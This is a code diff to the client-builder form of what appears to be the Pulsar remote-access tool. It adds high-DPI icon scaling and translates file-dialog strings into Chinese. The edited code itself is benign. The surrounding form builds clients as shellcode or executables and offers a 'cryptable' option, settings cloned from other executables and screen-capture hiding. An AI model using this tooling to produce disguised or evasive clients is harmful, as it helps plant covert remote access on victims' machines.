@@ -34,6 +34,7 @@ namespace Pulsar.Server.Forms
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ApplyHighDpiImages();
 
             txtHost.TextChanged += txtHost_TextChanged;
             txtHost.KeyDown += TxtHost_KeyDown;
@@ -61,6 +62,18 @@ namespace Pulsar.Server.Forms
 
             checkBox1.CheckedChanged += CheckBox1_CheckedChanged;
             chkCryptable.CheckedChanged += ChkCryptable_CheckedChanged;
+        }
+
+        private void ApplyHighDpiImages()
+        {
+            float scale = DpiImageScaling.GetScaleFactor(this);
+
+            // 右键菜单图标（与主界面同一套 DPI 算法）。
+            DpiImageScaling.ApplyToToolStrip(contextMenuStrip, scale);
+
+            // UAC 盾牌小图标（原图 16px）按 DPI 缩放。
+            DpiImageScaling.ApplyToIconPictureBox(picUAC1, scale);
+            DpiImageScaling.ApplyToIconPictureBox(picUAC2, scale);
         }
 
         private void CheckBox1_CheckedChanged(object sender, EventArgs e)
@@ -498,7 +511,7 @@ namespace Pulsar.Server.Forms
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 ofd.Title = "选择图标";
-                ofd.Filter = "Icons *.ico|*.ico";
+                ofd.Filter = "图标文件 (*.ico)|*.ico";
                 ofd.Multiselect = false;
                 if (ofd.ShowDialog() == DialogResult.OK)
                 {
@@ -617,7 +630,7 @@ namespace Pulsar.Server.Forms
             using (SaveFileDialog sfd = new SaveFileDialog())
             {
                 sfd.Title = "保存客户端为";
-                sfd.Filter = isShellcode ? "Shellcode Binary *.bin|*.bin" : "Executables *.exe|*.exe";
+                sfd.Filter = isShellcode ? "Shellcode 二进制 (*.bin)|*.bin" : "可执行文件 (*.exe)|*.exe";
                 sfd.RestoreDirectory = true;
                 sfd.FileName = isShellcode ? "Pulsar-Client.bin" : "Pulsar-Client.exe";
                 if (sfd.ShowDialog() != DialogResult.OK)
@@ -925,7 +938,7 @@ namespace Pulsar.Server.Forms
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 ofd.Title = "选择要克隆设置的可执行文件";
-                ofd.Filter = "Executable files (*.exe)|*.exe";
+                ofd.Filter = "可执行文件 (*.exe)|*.exe";
                 ofd.Multiselect = false;
 
                 if (ofd.ShowDialog() == DialogResult.OK)
